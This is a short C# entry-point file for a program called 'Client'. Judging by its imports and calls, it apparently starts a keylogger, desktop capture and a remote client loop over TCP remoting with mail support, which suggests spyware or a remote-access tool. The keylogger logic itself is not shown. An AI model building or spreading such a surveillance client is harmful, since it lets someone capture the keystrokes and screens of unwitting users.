﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using RemotingInterface;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Windows.Input;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Timers;
using System.Threading;
using System.IO;


namespace Client
{
    internal class Program
    {
        [STAThread]

        static void Main(string[] args)
        {
            Desktop.initClientDesktop();
            Keylogger.initClientKeylogger();
            Base.ClientLoop();
        }
    }
}
